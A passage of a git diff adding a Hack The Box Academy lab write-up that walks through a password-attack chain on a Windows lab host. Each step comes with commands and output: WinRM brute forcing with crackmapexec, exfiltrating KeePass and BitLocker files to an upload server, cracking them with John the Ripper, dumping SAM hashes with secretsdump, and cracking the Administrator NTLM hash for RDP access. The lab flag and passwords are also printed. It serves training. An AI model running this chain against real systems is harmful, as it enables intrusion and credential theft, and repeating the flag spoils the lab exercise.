@@ -5,7 +5,7 @@
 * Difficulty: Medium
 * Category: Offensive
 * Time estimate: 8 hours
-* Date: DD-MM-YYYY
+* Date: 13-02-2023
 * Author: [DjikstraCS](https://github.com/DjikstraCS)
 
 ---
@@ -2357,11 +2357,320 @@ HTB{PeopleReuse_PWsEverywhere!}
 **Answer:** `HTB{PeopleReuse_PWsEverywhere!}`
 
 ---
-##
+## Password Attacks Lab - Hard
 ### Question:
 
+nmap:
 
-**Answer:** ``
+```
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ sudo nmap -n -sV -sC 10.129.107.239  
+[sudo] password for kali: 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 05:00 EST
+Nmap scan report for 10.129.107.239
+Host is up (0.058s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+(...)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+2049/tcp open  mountd        1-3 (RPC #100005)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WINSRV
+|   NetBIOS_Domain_Name: WINSRV
+|   NetBIOS_Computer_Name: WINSRV
+|   DNS_Domain_Name: WINSRV
+|   DNS_Computer_Name: WINSRV
+|   Product_Version: 10.0.17763
+|_  System_Time: 2023-02-13T10:01:17+00:00
+|_ssl-date: 2023-02-13T10:01:25+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=WINSRV
+| Not valid before: 2023-02-12T09:59:53
+|_Not valid after:  2023-08-14T09:59:53
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2023-02-13T10:01:21
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 104.11 seconds
+
+```
+
+Bruteforce RDP login.
+
+```
+┌──(kali㉿kali)-[~/Downloads/Password-Attacks/Password-Attacks]
+└─$ crackmapexec winrm 10.129.202.222 -u Johanna -p mut_password2.list
+SMB         10.129.202.222  5985   WINSRV           [] Windows 10.0 Build 17763 (name:WINSRV) (domain:WINSRV)
+HTTP        10.129.202.222  5985   WINSRV           [] http://10.129.202.222:5985/wsman
+WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna: "SpnegoError (16): Operation not supported or available, Context: Retrieving NTLM store without NTLM_USER_FILE set to a filepath"
+WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:!
+WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:00000
+WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:00000!
+(...)
+WINSRV\Johanna:1231232022!
+WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:1231233
+WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:1231233!
+WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:1231234
+WINRM       10.129.202.222  5985   WINSRV           [+] WINSRV\Johanna:1231234! (Pwn3d!)
+```
+
+There is a KeePass file in the Documents folder.
+
+![](./attachments/Pasted%20image%2020230213113541.png)
+
+Let's upload it to our attack host. First we will setup an upload server on the host.
+
+```
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ python3 -m uploadserver 8000
+```
+
+The server will be up at `http://10.10.15.86:8000/upload`.
+
+Navigate to the page and upload the file.
+
+![](./attachments/Pasted%20image%2020230213113945.png)
+
+The file is recieved:
+
+```
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ ls         
+Logins.kdbx  
+```
+
+Let's use John the Ripper to extract the hash.
+
+```
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ locate *2john* | grep keepass
+/usr/sbin/keepass2john
+
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ keepass2john Logins.kdbx > keepass.hash
+ 
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ ls                           
+keepass.hash  Logins.kdbx 
+
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ john  --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list keepass.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Qwerty7!         (Logins)     
+1g 0:00:04:47 DONE (2023-02-13 05:49) 0.003481g/s 254.4p/s 254.4c/s 254.4C/s qwerty4!..qwerty8
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+Pass: `Qwerty7!`
+
+Open the file by double-clicking and insert the password to open the vault.
+
+![](./attachments/Pasted%20image%2020230213120051.png)
+
+user:pass `david:gRzX7YbeTcDG7`
+
+The recycle bin also contains passwords.
+
+![](./attachments/Pasted%20image%2020230213120256.png)
+
+user:pass `User Name:Password`
+user:pass `Michael321:12345`
+
+Running `cmd` as user david reveals a `backup.vhd` file. 
+
+if we move it ti the public folder vi can access is at user Johanna and upload it to our python uploadserver.
+
+```
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ bitlocker2john -i Backup.vhd > backup.hashes
+
+Signature found at 0x1000003
+Version: 8 
+Invalid version, looking for a signature with valid version...
+
+Signature found at 0x3200000
+Version: 2 (Windows 7 or later)
+
+VMK entry found at 0x32000b1
+
+VMK encrypted with User Password found at 32000d2
+VMK encrypted with AES-CCM
+
+VMK entry found at 0x3200191
+
+VMK encrypted with Recovery Password found at 0x32001b2
+Searching AES-CCM from 0x32001ce
+Trying offset 0x3200261....
+VMK encrypted with AES-CCM!!
+
+Signature found at 0x3eab000
+Version: 2 (Windows 7 or later)
+
+VMK entry found at 0x3eab0b1
+
+VMK entry found at 0x3eab191
+
+Signature found at 0x4b56000
+Version: 2 (Windows 7 or later)
+
+VMK entry found at 0x4b560b1
+
+VMK entry found at 0x4b56191
+
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ grep "bitlocker\$0" backup.hashes > backup.hash
+
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ john --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list backup.hash
+Note: This format may emit false positives, so it will keep trying even after finding a possible candidate.
+Using default input encoding: UTF-8
+Loaded 1 password hash (BitLocker, BitLocker [SHA-256 AES 32/64])
+Cost 1 (iteration count) is 1048576 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+123456789!       (?)
+```
+
+Pass: `123456789!`
+
+Now we need to mount the drive according to [this](https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0) article.
+
+```
+┌──(kali㉿kali)-[/mnt]
+└─$ sudo modprobe nbd
+
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ sudo qemu-nbd -c /dev/nbd0 Backup.vhd
+WARNING: Image format was not specified for 'Backup.vhd' and probing guessed raw.
+         Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted.
+         Specify the 'raw' format explicitly to remove the restrictions.
+
+┌──(kali㉿kali)-[/dev]
+└─$ lsblk
+NAME     MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
+sda        8:0    0 80.1G  0 disk 
+└─sda1     8:1    0 80.1G  0 part /
+sr0       11:0    1 1024M  0 rom  
+nbd0      43:0    0  130M  0 disk 
+├─nbd0p1  43:1    0   16M  0 part 
+└─nbd0p2  43:2    0  112M  0 part 
+(...)
+
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ sudo cryptsetup bitlkOpen /dev/nbd0p2 backup 
+Enter passphrase for /dev/nbd0p2:
+
+┌──(kali㉿kali)-[/dev/mapper]
+└─$ sudo mkdir /mnt/backup
+
+┌──(kali㉿kali)-[/dev/mapper]
+└─$ sudo mount /dev/mapper/backup /mnt/backup
+
+┌──(kali㉿kali)-[/dev/mapper]
+└─$ cd /mnt/backup
+
+┌──(kali㉿kali)-[/mnt/backup]
+└─$ ls
+'$RECYCLE.BIN'   SAM   SYSTEM  'System Volume Information'
+
+┌──(kali㉿kali)-[/mnt/backup]
+└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
+sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
+david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
+johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
+[*] Cleaning up...
+```
+
+Administrator NTLM hash: `e53d4d912d96874e83429886c7bf22a1`
+
+Now we just need use the hash to crack the password. 
+
+```
+┌──(kali㉿kali)-[/mnt/backup]
+└─$ john --format=NT --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list NTLM.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Liverp00l8!      (?)     
+1g 0:00:00:00 DONE (2023-02-13 14:32) 100.0g/s 5107Kp/s 5107Kc/s 5107KC/s Liverp00l2020!..liverpool2010!
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+And with hashcat
+
+```
+┌──(kali㉿kali)-[/mnt/backup]
+└─$ sudo hashcat -m 1000 NTLM.hash ~/HTB/PasswordAttacks/PasswordMutations/mut_password.list 
+
+(...)
+
+e53d4d912d96874e83429886c7bf22a1:Liverp00l8!              
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: e53d4d912d96874e83429886c7bf22a1
+Time.Started.....: Mon Feb 13 14:33:13 2023 (0 secs)
+Time.Estimated...: Mon Feb 13 14:33:13 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/home/kali/HTB/PasswordAttacks/PasswordMutations/mut_password.list)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  4906.3 kH/s (0.10ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 51200/94044 (54.44%)
+Rejected.........: 0/51200 (0.00%)
+Restore.Point....: 49152/94044 (52.26%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: l0vely84! -> Liverpool92!
+Hardware.Mon.#1..: Util: 24%
+
+Started: Mon Feb 13 14:33:12 2023
+Stopped: Mon Feb 13 14:33:15 2023
+```
+
+user:pass `Administrator:Liverp00l8!`
+
+Now RDP into the box as Administrator.
+
+```
+┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
+└─$ xfreerdp /u:Administrator /p:'Liverp00l8!' /v:10.129.103.24
+```
+
+![](./attachments/Pasted%20image%2020230213203952.png)
+
+**Answer:** `HTB{PWcr4ck1ngokokok}`
 
 ---
 **Tags:** [[Hack The Box Academy]]
